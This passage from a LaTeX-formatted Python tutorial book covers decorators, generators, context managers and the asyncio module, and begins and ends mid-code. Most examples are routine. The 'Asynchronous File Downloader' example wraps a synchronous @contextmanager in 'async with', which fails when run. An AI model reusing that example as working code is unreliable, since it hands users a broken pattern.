        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Executing }\SpecialCharTok{\{}\NormalTok{func}\SpecialCharTok{.}\VariableTok{\_\_name\_\_}\SpecialCharTok{\}}\SpecialStringTok{ with arguments }\SpecialCharTok{\{}\NormalTok{args}\SpecialCharTok{\}}\SpecialStringTok{ and }\SpecialCharTok{\{}\NormalTok{kwargs}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{func}\SpecialCharTok{.}\VariableTok{\_\_name\_\_}\SpecialCharTok{\}}\SpecialStringTok{ returned }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ result}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@logger}
\KeywordTok{def}\NormalTok{ add(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{+}\NormalTok{ b}

\BuiltInTok{print}\NormalTok{(add(}\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Generators}\label{generators}

Generators are a special type of iterator that allow you to iterate
through a sequence of values lazily, meaning they generate values on the
fly and only when needed.

\subsubsection{\texorpdfstring{Creating Generators with
\texttt{yield}}{Creating Generators with yield}}\label{creating-generators-with-yield}

\paragraph{Example: Simple Generator}\label{example-simple-generator}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ countdown(n):}
    \ControlFlowTok{while}\NormalTok{ n }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
        \ControlFlowTok{yield}\NormalTok{ n}
\NormalTok{        n }\OperatorTok{{-}=} \DecValTok{1}

\CommentTok{\# Using the generator}
\ControlFlowTok{for}\NormalTok{ number }\KeywordTok{in}\NormalTok{ countdown(}\DecValTok{5}\NormalTok{):}
    \BuiltInTok{print}\NormalTok{(number)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Generator Expressions}\label{generator-expressions}

Generator expressions provide a concise way to create generators.

\paragraph{Example: Generator
Expression}\label{example-generator-expression}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Generator expression to create a sequence of squares}
\NormalTok{squares }\OperatorTok{=}\NormalTok{ (x }\OperatorTok{*}\NormalTok{ x }\ControlFlowTok{for}\NormalTok{ x }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{10}\NormalTok{))}

\CommentTok{\# Using the generator}
\ControlFlowTok{for}\NormalTok{ square }\KeywordTok{in}\NormalTok{ squares:}
    \BuiltInTok{print}\NormalTok{(square)}
\end{Highlighting}
\end{Shaded}

\subsection{Context Managers}\label{context-managers}

Context managers are used to properly manage resources, ensuring that
they are properly cleaned up after use. The \texttt{with} statement is
used to wrap the execution of a block of code within methods defined by
a context manager.

\subsubsection{\texorpdfstring{Using \texttt{contextlib} to Create
Context
Managers}{Using contextlib to Create Context Managers}}\label{using-contextlib-to-create-context-managers}

The \texttt{contextlib} module provides utilities for working with
context managers.

\paragraph{Example: Creating a Simple Context
Manager}\label{example-creating-a-simple-context-manager}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ contextmanager}

\AttributeTok{@contextmanager}
\KeywordTok{def}\NormalTok{ open\_file(}\BuiltInTok{file}\NormalTok{, mode):}
\NormalTok{    f }\OperatorTok{=} \BuiltInTok{open}\NormalTok{(}\BuiltInTok{file}\NormalTok{, mode)}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{yield}\NormalTok{ f}
    \ControlFlowTok{finally}\NormalTok{:}
\NormalTok{        f.close()}

\CommentTok{\# Using the context manager}
\ControlFlowTok{with}\NormalTok{ open\_file(}\StringTok{\textquotesingle{}test.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ f:}
\NormalTok{    f.write(}\StringTok{\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Putting It All Together}\label{putting-it-all-together}

Let's combine these advanced concepts into a single example to
demonstrate their power and utility.

\paragraph{Example: Asynchronous File Downloader with Logging and
Context
Management}\label{example-asynchronous-file-downloader-with-logging-and-context-management}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}
\ImportTok{from}\NormalTok{ contextlib }\ImportTok{import}\NormalTok{ contextmanager}

\CommentTok{\# Context manager for logging}
\AttributeTok{@contextmanager}
\KeywordTok{def}\NormalTok{ logger(func\_name):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Starting }\SpecialCharTok{\{}\NormalTok{func\_name}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \ControlFlowTok{yield}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Finished }\SpecialCharTok{\{}\NormalTok{func\_name}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Asynchronous function to simulate file download}
\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ download\_file(}\BuiltInTok{file}\NormalTok{):}
    \ControlFlowTok{async} \ControlFlowTok{with}\NormalTok{ logger(}\SpecialStringTok{f"download\_file(}\SpecialCharTok{\{}\BuiltInTok{file}\SpecialCharTok{\}}\SpecialStringTok{)"}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Downloading }\SpecialCharTok{\{}\BuiltInTok{file}\SpecialCharTok{\}}\SpecialStringTok{..."}\NormalTok{)}
        \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{2}\NormalTok{)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Downloaded }\SpecialCharTok{\{}\BuiltInTok{file}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Main asynchronous function to download multiple files}
\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ main(files):}
    \ControlFlowTok{await}\NormalTok{ asyncio.gather(}\OperatorTok{*}\NormalTok{(download\_file(}\BuiltInTok{file}\NormalTok{) }\ControlFlowTok{for} \BuiltInTok{file} \KeywordTok{in}\NormalTok{ files))}

\CommentTok{\# Running the main function}
\NormalTok{files }\OperatorTok{=}\NormalTok{ [}\StringTok{"file1.txt"}\NormalTok{, }\StringTok{"file2.txt"}\NormalTok{, }\StringTok{"file3.txt"}\NormalTok{]}
\NormalTok{asyncio.run(main(files))}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-33}

Advanced Python concepts such as asynchronous programming, decorators,
generators, and context managers can greatly enhance the functionality
and efficiency of your code. By mastering these techniques, you can
write more powerful, flexible, and maintainable Python programs. Use
these tools to take your Python skills to the next level and tackle more
complex problems with ease.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{asyncio} Module in
Python}{Deep Dive into the asyncio Module in Python}}\label{deep-dive-into-the-asyncio-module-in-python}

The \texttt{asyncio} module in Python provides a framework for writing
asynchronous, concurrent code using the \texttt{async} and
\texttt{await} keywords. It is part of Python's standard library and is
used to manage asynchronous I/O operations, enabling the development of
high-performance network and web servers, database connections,
distributed task queues, and other concurrent applications.

\section{Table of Contents}\label{table-of-contents-10}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-asynchronous-programming]{Introduction to
  Asynchronous Programming}
\item
  \hyperref[key-concepts]{Key Concepts}
\item
  \hyperref[basic-usage]{Basic Usage}
\item
  \hyperref[tasks-and-coroutines]{Tasks and Coroutines}
\item
  \hyperref[managing-tasks]{Managing Tasks}
\item
  \hyperref[synchronization-primitives]{Synchronization Primitives}
\item
  \hyperref[asynchronous-io]{Asynchronous I/O}
\item
  \hyperref[creating-a-simple-web-server]{Creating a Simple Web Server}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Asynchronous
Programming}\label{introduction-to-asynchronous-programming}

Asynchronous programming allows a program to perform tasks concurrently,
without waiting for one task to complete before starting another. This
is especially useful for I/O-bound and high-level structured network
code.

In synchronous programming, tasks are executed sequentially. If one task
takes a long time to complete (e.g., waiting for a network response), it
can block the entire program. Asynchronous programming avoids this by
allowing other tasks to run while waiting for long-running tasks to
complete.

\section{Key Concepts}\label{key-concepts-1}

Before diving into \texttt{asyncio}, it's important to understand some
key concepts:

\begin{itemize}
\tightlist
\item
  \textbf{Coroutines}: Special functions defined with
  \texttt{async\ def} that can be paused and resumed.
\item
  \textbf{Event Loop}: The core of an asynchronous application,
  responsible for executing asynchronous tasks, handling I/O operations,
  and coordinating the overall execution flow.
\item
  \textbf{Tasks}: Wrappers around coroutines that can be scheduled and
  managed by the event loop.
\item
  \textbf{Futures}: Represent results of asynchronous operations that
  may not be available yet.
\item
  \textbf{Await}: A keyword used to pause the execution of a coroutine
  until the awaited coroutine completes.
\end{itemize}

\section{Basic Usage}\label{basic-usage-3}

\subsection{Example: Running a Simple
Coroutine}\label{example-running-a-simple-coroutine}

Let's start with a simple example to understand how coroutines and the
event loop work together:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ say\_hello():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Hello"}\NormalTok{)}
    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{1}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"World"}\NormalTok{)}

\CommentTok{\# Get the default event loop and run the coroutine}
\NormalTok{asyncio.run(say\_hello())}
\end{Highlighting}
\end{Shaded}

In this example, \texttt{say\_hello} is a coroutine that prints
``Hello'', waits for 1 second, and then prints ``World''. The
\texttt{asyncio.run} function starts an event loop, runs the coroutine,
and closes the loop when the coroutine is finished.

\section{Tasks and Coroutines}\label{tasks-and-coroutines}

\subsection{Creating and Running Multiple
Coroutines}\label{creating-and-running-multiple-coroutines}

You can create multiple coroutines and run them concurrently using
\texttt{asyncio.gather}:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task1():}
    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{1}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 1 completed"}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task2():}
    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{2}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 2 completed"}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ main():}
    \ControlFlowTok{await}\NormalTok{ asyncio.gather(task1(), task2())}

\NormalTok{asyncio.run(main())}
\end{Highlighting}
\end{Shaded}

In this example, \texttt{task1} and \texttt{task2} are coroutines that
run concurrently. \texttt{asyncio.gather} runs both coroutines and waits
for both to complete.

\section{Managing Tasks}\label{managing-tasks}

\subsection{Creating and Cancelling
Tasks}\label{creating-and-cancelling-tasks}

You can create tasks explicitly using \texttt{asyncio.create\_task}, and
you can cancel tasks if needed:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task1():}
    \ControlFlowTok{try}\NormalTok{:}
        \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{3}\NormalTok{)}
    \ControlFlowTok{except}\NormalTok{ asyncio.CancelledError:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 1 was cancelled"}\NormalTok{)}
        \ControlFlowTok{raise}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task2():}
    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{2}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 2 completed"}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ main():}
\NormalTok{    t1 }\OperatorTok{=}\NormalTok{ asyncio.create\_task(task1())}
\NormalTok{    t2 }\OperatorTok{=}\NormalTok{ asyncio.create\_task(task2())}

    \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{1}\NormalTok{)}
\NormalTok{    t1.cancel()}

    \ControlFlowTok{await}\NormalTok{ asyncio.gather(t1, t2, return\_exceptions}\OperatorTok{=}\VariableTok{True}\NormalTok{)}

\NormalTok{asyncio.run(main())}
\end{Highlighting}
\end{Shaded}

In this example, \texttt{task1} is cancelled after 1 second, while
\texttt{task2} completes normally. The \texttt{CancelledError} is caught
and handled in \texttt{task1}.

\section{Synchronization Primitives}\label{synchronization-primitives}

\subsection{Using Locks}\label{using-locks}

\texttt{asyncio} provides several synchronization primitives, such as
\texttt{Lock}, \texttt{Event}, \texttt{Condition}, and
\texttt{Semaphore}.

\subsubsection{Example: Using a Lock}\label{example-using-a-lock}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}

\NormalTok{lock }\OperatorTok{=}\NormalTok{ asyncio.Lock()}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task1():}
    \ControlFlowTok{async} \ControlFlowTok{with}\NormalTok{ lock:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 1 acquired lock"}\NormalTok{)}
        \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{2}\NormalTok{)}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 1 released lock"}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ task2():}
    \ControlFlowTok{async} \ControlFlowTok{with}\NormalTok{ lock:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 2 acquired lock"}\NormalTok{)}
        \ControlFlowTok{await}\NormalTok{ asyncio.sleep(}\DecValTok{2}\NormalTok{)}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Task 2 released lock"}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ main():}
    \ControlFlowTok{await}\NormalTok{ asyncio.gather(task1(), task2())}

\NormalTok{asyncio.run(main())}
\end{Highlighting}
\end{Shaded}

In this example, \texttt{task1} and \texttt{task2} acquire and release
the same lock. Only one task can hold the lock at a time, ensuring that
the critical section is accessed by only one task at a time.

\section{Asynchronous I/O}\label{asynchronous-io}

\subsection{Example: Asynchronous File
I/O}\label{example-asynchronous-file-io}

You can perform asynchronous file I/O using the \texttt{aiofiles}
library:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ asyncio}
\ImportTok{import}\NormalTok{ aiofiles}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ write\_file():}
    \ControlFlowTok{async} \ControlFlowTok{with}\NormalTok{ aiofiles.}\BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{, mode}\OperatorTok{=}\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ f:}
        \ControlFlowTok{await}\NormalTok{ f.write(}\StringTok{\textquotesingle{}Hello, asyncio!\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ read\_file():}
    \ControlFlowTok{async} \ControlFlowTok{with}\NormalTok{ aiofiles.}\BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{, mode}\OperatorTok{=}\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ f:}
\NormalTok{        contents }\OperatorTok{=} \ControlFlowTok{await}\NormalTok{ f.read()}
        \BuiltInTok{print}\NormalTok{(contents)}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ main():}
    \ControlFlowTok{await}\NormalTok{ write\_file()}
    \ControlFlowTok{await}\NormalTok{ read\_file()}

\NormalTok{asyncio.run(main())}
\end{Highlighting}
\end{Shaded}

In this example, \texttt{write\_file} writes to a file asynchronously,
and \texttt{read\_file} reads from the file asynchronously using the
\texttt{aiofiles} library.

\section{Creating a Simple Web
Server}\label{creating-a-simple-web-server}

\subsection{\texorpdfstring{Example: Simple HTTP Server with
\texttt{aiohttp}}{Example: Simple HTTP Server with aiohttp}}\label{example-simple-http-server-with-aiohttp}

You can create an asynchronous HTTP server using the \texttt{aiohttp}
library:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ aiohttp }\ImportTok{import}\NormalTok{ web}
\ImportTok{import}\NormalTok{ asyncio}

\ControlFlowTok{async} \KeywordTok{def}\NormalTok{ handle(request):}
    \ControlFlowTok{return}\NormalTok{ web.Response(text}\OperatorTok{=}\StringTok{"Hello, asyncio!"}\NormalTok{)}

\NormalTok{app }\OperatorTok{=}\NormalTok{ web.Application()}
\NormalTok{app.add\_routes([web.get(}\StringTok{\textquotesingle{}/\textquotesingle{}}\NormalTok{, handle)])}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    web.run\_app(app)}
\end{Highlighting}
\end{Shaded}

In this example, we create a simple HTTP server that responds with
``Hello, asyncio!'' to any GET request on the root URL.

\section{Best Practices}\label{best-practices-2}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Avoid Blocking Calls}: Ensure that you do not use blocking
  calls in your asynchronous code, as this can block the event loop and
  degrade performance.
\item
  \textbf{Use \texttt{async} and \texttt{await} Appropriately}: Make
  sure to use \texttt{async} and \texttt{await} for all asynchronous
  functions and calls.
\item
  \textbf{Handle Exceptions}: Always handle exceptions in coroutines and
  tasks to prevent them from propagating and crashing the application.
\item
  \textbf{Limit Concurrency}: Use semaphores or other synchronization
  primitives to limit concurrency and avoid overwhelming resources.
\item
  \textbf{Leverage Libraries}: Use well-established libraries like
  \texttt{aiohttp} for HTTP operations and \texttt{aiomysql} or
  \texttt{aiopg} for database access to avoid reinventing the wheel.
\end{enumerate}

\section{Conclusion}\label{conclusion-34}

The \texttt{asyncio} module provides a powerful framework for writing
concurrent and asynchronous code in Python. By leveraging its features,
you can build efficient and scalable applications that handle I/O-bound
tasks effectively. This tutorial covered the basics of \texttt{asyncio},
including coroutines, tasks, synchronization primitives, and
asynchronous I/O. With this foundation, you can explore more advanced
topics and libraries to enhance your asynchronous programming skills.

\bookmarksetup{startatroot}

\chapter{Deep Dive into Python
Decorators}\label{deep-dive-into-python-decorators}

Decorators are a powerful and flexible feature in Python that allows the
modification of functions or methods using other functions. They are
commonly used for logging, access control, memoization, and many other
cross-cutting concerns.

\section{Table of Contents}\label{table-of-contents-11}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-decorators]{Introduction to Decorators}
\item
  \hyperref[function-decorators]{Function Decorators}
\item
  \hyperref[class-decorators]{Class Decorators}
\item
  \hyperref[using-multiple-decorators]{Using Multiple Decorators}
\item
  \hyperref[built-in-decorators]{Built-in Decorators}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Decorators}\label{introduction-to-decorators}

A decorator is a function that takes another function and extends its
behavior without explicitly modifying it. Decorators provide a way to
dynamically alter the functionality of your code.

\subsection{Basic Decorator Example}\label{basic-decorator-example}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ my\_decorator(func):}
    \KeywordTok{def}\NormalTok{ wrapper():}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Something is happening before the function is called."}\NormalTok{)}
\NormalTok{        func()}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Something is happening after the function is called."}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@my\_decorator}
\KeywordTok{def}\NormalTok{ say\_hello():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Hello!"}\NormalTok{)}

\NormalTok{say\_hello()}
\end{Highlighting}
\end{Shaded}

In this example, \texttt{my\_decorator} is a decorator function that
wraps the \texttt{say\_hello} function, adding some behavior before and
after it is called.

\section{Function Decorators}\label{function-decorators}

\subsection{Creating and Using Function
Decorators}\label{creating-and-using-function-decorators}

A function decorator is a function that takes another function as an
argument and returns a new function that adds some behavior.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ decorator(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Before the function call"}\NormalTok{)}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"After the function call"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ result}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@decorator}
\KeywordTok{def}\NormalTok{ greet(name):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{greet(}\StringTok{"Alice"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Decorating Functions with
Arguments}\label{decorating-functions-with-arguments}

You can also create decorators that work with functions that have
arguments.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ decorator(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Arguments: }\SpecialCharTok{\{}\NormalTok{args}\SpecialCharTok{\}}\SpecialStringTok{ }\SpecialCharTok{\{}\NormalTok{kwargs}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
        \ControlFlowTok{return}\NormalTok{ result}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@decorator}
\KeywordTok{def}\NormalTok{ add(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{+}\NormalTok{ b}

\BuiltInTok{print}\NormalTok{(add(}\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Passing Arguments to
Decorators}\label{passing-arguments-to-decorators}

You can pass arguments to decorators by adding an extra layer of
wrapping.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ repeat(num\_times):}
    \KeywordTok{def}\NormalTok{ decorator(func):}
        \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
            \ControlFlowTok{for}\NormalTok{ \_ }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(num\_times):}
\NormalTok{                result }\OperatorTok{=}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
            \ControlFlowTok{return}\NormalTok{ result}
        \ControlFlowTok{return}\NormalTok{ wrapper}
    \ControlFlowTok{return}\NormalTok{ decorator}

\AttributeTok{@repeat}\NormalTok{(}\DecValTok{3}\NormalTok{)}
\KeywordTok{def}\NormalTok{ say\_hello(name):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{say\_hello(}\StringTok{"Bob"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Class Decorators}\label{class-decorators}

Class decorators are similar to function decorators but are used to
modify classes.

\subsection{Basic Class Decorator}\label{basic-class-decorator}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ class\_decorator(cls):}
    \KeywordTok{class}\NormalTok{ Wrapped(cls):}
        \KeywordTok{def}\NormalTok{ new\_method(}\VariableTok{self}\NormalTok{):}
            \BuiltInTok{print}\NormalTok{(}\StringTok{"New method added by decorator"}\NormalTok{)}
\NormalTok{        cls.new\_method }\OperatorTok{=}\NormalTok{ new\_method}
    \ControlFlowTok{return}\NormalTok{ Wrapped}

\AttributeTok{@class\_decorator}
\KeywordTok{class}\NormalTok{ MyClass:}
    \KeywordTok{def}\NormalTok{ method(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Original method"}\NormalTok{)}

\NormalTok{obj }\OperatorTok{=}\NormalTok{ MyClass()}
\NormalTok{obj.method()}
\NormalTok{obj.new\_method()}
\end{Highlighting}
\end{Shaded}

\subsection{Using Class Decorators to Modify
Methods}\label{using-class-decorators-to-modify-methods}

You can also use class decorators to modify class methods.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ method\_decorator(method):}
    \KeywordTok{def}\NormalTok{ wrapper(}\VariableTok{self}\NormalTok{, }\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Before method call"}\NormalTok{)}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ method(}\VariableTok{self}\NormalTok{, }\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"After method call"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ result}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\KeywordTok{def}\NormalTok{ class\_decorator(cls):}
\NormalTok{    cls.method }\OperatorTok{=}\NormalTok{ method\_decorator(cls.method)}
    \ControlFlowTok{return}\NormalTok{ cls}

\AttributeTok{@class\_decorator}
\KeywordTok{class}\NormalTok{ MyClass:}
    \KeywordTok{def}\NormalTok{ method(}\VariableTok{self}\NormalTok{):}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Original method"}\NormalTok{)}

\NormalTok{obj }\OperatorTok{=}\NormalTok{ MyClass()}
\NormalTok{obj.method()}
\end{Highlighting}
\end{Shaded}

\section{Using Multiple Decorators}\label{using-multiple-decorators}

You can stack multiple decorators on a single function or method.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ decorator1(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Decorator 1"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\KeywordTok{def}\NormalTok{ decorator2(func):}
    \KeywordTok{def}\NormalTok{ wrapper(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Decorator 2"}\NormalTok{)}
        \ControlFlowTok{return}\NormalTok{ func(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}
    \ControlFlowTok{return}\NormalTok{ wrapper}

\AttributeTok{@decorator1}
\AttributeTok{@decorator2}
\KeywordTok{def}\NormalTok{ greet(name):}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{greet(}\StringTok{"Alice"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

In this example, \texttt{decorator2} is applied first, followed by
\texttt{decorator1}.

\section{Built-in Decorators}\label{built-in-decorators}

Python provides several built-in decorators, such as
\texttt{@staticmethod}, \texttt{@classmethod}, and \texttt{@property}.

\subsection{Static Method}\label{static-method}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ MyClass:}
    \AttributeTok{@staticmethod}
    \KeywordTok{def}\NormalTok{ static\_method():}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"This is a static method"}\NormalTok{)}

\NormalTok{MyClass.static\_method()}
\end{Highlighting}
\end{Shaded}

\subsection{Class Method}\label{class-method}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ MyClass:}
    \AttributeTok{@classmethod}
    \KeywordTok{def}\NormalTok{ class\_method(cls):}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"This is a class method of }\SpecialCharTok{\{}\NormalTok{cls}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{MyClass.class\_method()}
\end{Highlighting}
\end{Shaded}

\subsection{Property}\label{property}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ MyClass:}
    \KeywordTok{def} \FunctionTok{\_\_init\_\_}\NormalTok{(}\VariableTok{self}\NormalTok{, value):}
